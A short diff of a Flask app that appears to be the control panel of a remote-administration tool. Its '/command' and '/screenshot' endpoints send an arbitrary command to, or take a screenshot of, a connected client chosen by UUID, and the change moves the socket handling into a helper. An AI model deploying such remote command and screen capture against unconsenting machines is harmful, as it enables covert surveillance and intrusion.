@@ -1,5 +1,5 @@
 from flask import Flask, jsonify, request, render_template, send_file
-from server import *
+from api import *
 
 
 # Flask应用程序
@@ -34,26 +34,15 @@ def server_status():
 
 @app.route('/command', methods=['GET'])
 def command():
-    if not connection_thread.is_alive(): return ''
     client_uuid = request.args.get('uuid', '')
     command = request.args.get('cmd', '')
-    if not is_alive(client_uuid): return ''
-    client_socket = online_clients[client_uuid][0]
-    with client_locks[client_uuid]:
-        Protocol(extension=command).create_stream(client_socket.send)
-        response = Protocol().load_stream(client_socket.recv).json
-    return str(response)
+    respond = oneline_command(client_uuid, command)
+    return jsonify(respond.json)
 
 @app.route('/screenshot', methods=['GET'])
 def screenshot():
-    if not connection_thread.is_alive(): return ''
     client_uuid = request.args.get('uuid', '')
-    if not is_alive(client_uuid): return ''
-    client_socket = online_clients[client_uuid][0]
-    with client_locks[client_uuid]:
-        Protocol(extension='screenshot').create_stream(client_socket.send)
-        respond = Protocol().load_stream(client_socket.recv)
-        
+    respond = oneline_command(client_uuid, 'screenshot')
     return send_file(respond, mimetype='image/png')
 
 @app.route('/')
